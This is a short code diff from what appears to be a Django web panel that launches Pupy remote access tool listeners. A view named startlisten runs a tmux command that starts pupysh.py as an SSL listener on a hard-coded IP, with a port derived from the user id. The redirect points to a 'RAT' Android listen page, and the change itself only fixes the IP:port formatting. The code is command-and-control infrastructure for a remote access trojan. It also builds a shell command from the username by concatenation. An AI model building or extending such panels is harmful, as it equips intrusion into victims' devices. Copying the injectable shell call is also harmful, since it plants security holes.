@@ -81,7 +81,7 @@ def startlisten(request):
     port = 6666+int(request.user.id)
 
 
-    os.system('tmux send-keys -t '+str(username)+'-pupy "/root/django/pupy/pupy/pupysh.py -l ssl 185.120.221.217'+str(port)+'""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy "/root/django/pupy/pupy/pupysh.py -l ssl 185.120.221.217:'+str(port)+'""\n"')
 
     return redirect('RAT:pupy/android/listen')
 
